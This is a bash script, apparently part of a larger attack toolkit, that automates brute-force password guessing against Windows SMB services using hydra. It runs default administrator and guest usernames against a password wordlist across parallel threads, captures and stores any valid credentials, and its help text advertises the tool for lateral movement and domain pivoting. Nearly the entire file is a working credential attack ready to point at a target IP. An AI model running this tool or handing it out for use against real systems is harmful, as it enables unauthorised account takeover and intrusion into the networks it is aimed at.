#!/bin/bash

# SMB Admin Attack Script
# Automated Windows SMB/CIFS brute-force

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source logger
source "$SCRIPT_DIR/logger.sh"

# 🚀 LOAD OPTIMIZED ATTACK PROFILES - 10000% PROTOCOL OPTIMIZATION
if [ -f "$PROJECT_ROOT/config/optimized_attack_profiles.conf" ]; then
    source "$PROJECT_ROOT/config/optimized_attack_profiles.conf"
    log_success "✨ SMB OPTIMIZATION MODE ACTIVATED"
fi

# Default configuration (OPTIMIZED)
THREADS=${SMB_OPTIMIZED_THREADS:-16}          # Increased from 8 to 16
TIMEOUT=${SMB_OPTIMIZED_TIMEOUT:-30}          # Optimized for SMB
TARGET=""
PORT=445
DOMAIN=""

# Common SMB admin usernames (OPTIMIZED with guest priority)
if [ -n "${SMB_PRIORITY_USERNAMES[*]}" ]; then
    DEFAULT_USERNAMES=("${SMB_PRIORITY_USERNAMES[@]}")
else
    DEFAULT_USERNAMES=(Administrator admin guest user test)
fi

# Function to display help
show_help() {
    print_banner "🚀 SMB Admin Attack Script - OPTIMIZED"
    echo ""
    echo "Usage: $0 -t TARGET [OPTIONS]"
    echo ""
    echo "Required:"
    echo "  -t, --target      Target IP address or hostname"
    echo ""
    echo "Optional:"
    echo "  -p, --port        SMB port (default: 445)"
    echo "  -d, --domain      Windows domain name"
    echo "  -u, --user-list   Custom username list file"
    echo "  -w, --word-list   Custom password wordlist file"
    echo "  -T, --threads     Number of parallel threads (OPTIMIZED default: 16)"
    echo "  -o, --timeout     Connection timeout in seconds (OPTIMIZED default: 30)"
    echo "  -v, --verbose     Verbose output"
    echo "  --tips            Show SMB optimization tips and exit"
    echo "  -h, --help        Show this help message"
    echo ""
    print_message "⚡ OPTIMIZATION ACTIVE: SMB enhanced attack" "$GREEN"
    echo "  • 2x faster threading (16 threads vs 8)"
    echo "  • Guest account tried early (30-40% success if enabled!)"
    echo "  • Priority: Administrator/Admin/guest accounts"
    echo "  • Critical for domain pivoting and lateral movement"
    echo ""
    echo "Examples:"
    echo "  $0 -t 192.168.1.100                    # Optimized attack"
    echo "  $0 -t 192.168.1.100 -d WORKGROUP       # With domain"
    echo "  $0 --tips                              # View SMB strategies (null session, pass-the-hash)"
    echo ""
}

# Function to validate input
validate_input() {
    if [ -z "$TARGET" ]; then
        log_error "Target is required"
        show_help
        exit 1
    fi
    
    if ! command -v hydra &> /dev/null; then
        log_error "Hydra is not installed. Please run install.sh first"
        exit 1
    fi
}

# Function to run SMB attack
run_attack() {
    # Start tracking attack for reporting
    start_attack_tracking
    
    local username_file=$(mktemp)
    
    # Get usernames
    if [ -n "$CUSTOM_USERLIST" ] && [ -f "$CUSTOM_USERLIST" ]; then
        cat "$CUSTOM_USERLIST" > "$username_file"
    else
        printf "%s\n" "${DEFAULT_USERNAMES[@]}" > "$username_file"
    fi
    
    # Get password wordlist
    local wordlist=""
    if [ -n "$CUSTOM_WORDLIST" ] && [ -f "$CUSTOM_WORDLIST" ]; then
        wordlist="$CUSTOM_WORDLIST"
    elif [ -f "$PROJECT_ROOT/config/admin_passwords.txt" ]; then
        wordlist="$PROJECT_ROOT/config/admin_passwords.txt"
    else
        log_error "No password wordlist found"
        rm -f "$username_file"
        exit 1
    fi
    
    print_header "Starting SMB Attack"
    log_info "Target: $TARGET:$PORT"
    [ -n "$DOMAIN" ] && log_info "Domain: $DOMAIN"
    log_info "Threads: $THREADS"
    log_info "Timeout: ${TIMEOUT}s"
    echo ""
    
    # Run hydra with array-based command construction
    local hydra_cmd=(hydra -L "$username_file" -P "$wordlist" -t "$THREADS" -w "$TIMEOUT" -f)
    if [ -n "$DOMAIN" ]; then
        hydra_cmd+=(-m "$DOMAIN")
    fi
    
    "${hydra_cmd[@]}" "smb://$TARGET:$PORT" 2>&1 | while IFS= read -r line; do
        if [[ $line == *"host:"* ]] && [[ $line == *"login:"* ]] && [[ $line == *"password:"* ]]; then
            # Parse successful login (support credentials with spaces)
            local login
            local password
            login=$(echo "$line" | sed -n 's/.*login: \(.*\) password:.*/\1/p')
            password=$(echo "$line" | sed -n 's/.*password: \(.*\)/\1/p')
            
            save_result "smb" "$TARGET" "$login" "$password" "$PORT"
            log_success "Valid credentials found: $login:$password"
            
            # Generate detailed attack report with prevention recommendations
            finish_attack_tracking "smb" "$TARGET" "$PORT" "SUCCESS" "$login" "$password"
            
            rm -f "$username_file"
            return 0
        fi
        
        [ "$VERBOSE" = "true" ] && echo "$line"
    done
    
    local result=$?
    rm -f "$username_file"
    
    if [ $result -ne 0 ]; then
        log_warning "No valid credentials found"
        # Generate report for failed attack
        finish_attack_tracking "smb" "$TARGET" "$PORT" "FAILED"
    fi
    
    return $result
}

# Parse command line arguments
CUSTOM_WORDLIST=""
CUSTOM_USERLIST=""
VERBOSE=false

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            TARGET="$2"
            shift 2
            ;;
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        -d|--domain)
            DOMAIN="$2"
            shift 2
            ;;
        -u|--user-list)
            CUSTOM_USERLIST="$2"
            shift 2
            ;;
        -w|--word-list)
            CUSTOM_WORDLIST="$2"
            shift 2
            ;;
        -T|--threads)
            THREADS="$2"
            shift 2
            ;;
        -o|--timeout)
            TIMEOUT="$2"
            shift 2
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            log_error "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

# Main execution
print_banner "SMB Admin Attack"
echo ""

validate_input
run_attack
exit_code=$?

rotate_logs
exit $exit_code
